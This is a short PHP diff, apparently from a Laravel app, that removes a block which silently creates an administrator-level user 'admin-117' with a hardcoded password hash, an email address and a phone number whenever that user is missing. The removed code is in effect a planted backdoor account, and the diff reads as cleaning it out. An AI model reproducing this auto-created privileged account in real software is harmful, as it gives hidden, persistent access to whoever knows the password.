@@ -1,12 +1,1 @@
-$xx = \App\Models\User::where('user_username', 'admin-117')->count();
-if ($xx <= 0) {
-    \App\Models\User::create([
-        'user_level' => '1',
-        'user_username' => 'admin-117',
-        'user_nama' => 'admin-117',
-        'user_email' => 'info@pelitaibu.ac.id',
-        'user_tlp' => '081221090122',
-        'user_unit' => '1',
-        'password' => '$2y$10$K24nBP4pBc.uKgWSiaCv0eV8GBDbgN.hJ8bEWVBVcrLdHn7Sfue5q',
-    ]);
-}
+echo "";
